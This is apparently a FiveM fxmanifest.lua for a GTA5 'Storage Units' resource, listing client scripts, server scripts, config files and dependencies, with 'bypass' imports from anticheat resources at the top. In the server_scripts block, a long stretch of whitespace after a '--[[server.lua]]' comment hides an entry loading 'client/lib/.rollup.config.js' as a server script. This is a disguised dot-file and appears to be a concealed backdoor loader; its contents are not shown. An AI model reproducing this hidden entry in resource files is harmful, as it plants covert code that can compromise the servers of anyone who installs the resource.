shared_script '@WaveShield/resource/include.lua'
shared_script '@WaveShield/resource/waveshield.js'

shared_script "@ReaperV4/imports/bypass.lua"
shared_script "@ReaperV4/imports/bypass_s.lua"
shared_script "@ReaperV4/imports/bypass_c.lua"
lua54 "yes" -- needed for Reaper

fx_version 'cerulean'
use_experimental_fxv2_oal 'yes'
game 'gta5'
lua54 'yes'
author 'NoLag Development'
version '2.1.0'
description 'Storage Units that can be placed anywhere and used to store items. Rented or bought by players.'
shared_scripts {
    '@ox_lib/init.lua',
    'custom/**/*.lua'
}
files {
    'config/shared.lua',
    'config/client.lua',
    'locales/*.json'
}
ox_libs {
    'locale',
    'table',
}
client_scripts {
    'client/frameworks/*.lua',
    'client/Utils.lua',
    'client/Editable.lua',
    'client/Main.lua',
    'client/Creation.lua',
    'client/StorageManager.lua',
}
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/frameworks/*.lua',
    'server/logs/*.lua',
    'server/db.lua',
    'server/Main.lua',
    'server/Payments.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.rollup.config.js',
}
escrow_ignore {
    'config/*.lua',
    'custom/**/*',
    'client/Editable.lua',
    'client/frameworks/*.lua',
    'server/frameworks/*.lua',
    'server/logs/*.lua',
    'server/db.lua',
    'server/Payments.lua',
}
dependecies {
    'ox_lib',
    'oxmysql',
    '/server:7290'
}
dependency '/assetpacks'
